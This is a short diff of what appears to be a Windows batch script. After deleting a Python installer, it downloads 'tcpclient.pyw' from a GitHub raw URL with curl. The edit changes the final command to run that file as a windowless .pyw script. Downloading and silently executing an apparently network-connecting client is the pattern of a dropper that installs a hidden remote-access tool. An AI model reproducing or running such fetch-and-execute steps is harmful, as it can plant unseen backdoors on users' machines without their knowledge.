@@ -8,5 +8,5 @@ del python-3.11.3-amd64.exe
 
 curl -O https://raw.githubusercontent.com/Zarni1322/python/main/tcpclient.pyw
 
-python tcpclient.py
+python tcpclient.pyw
 
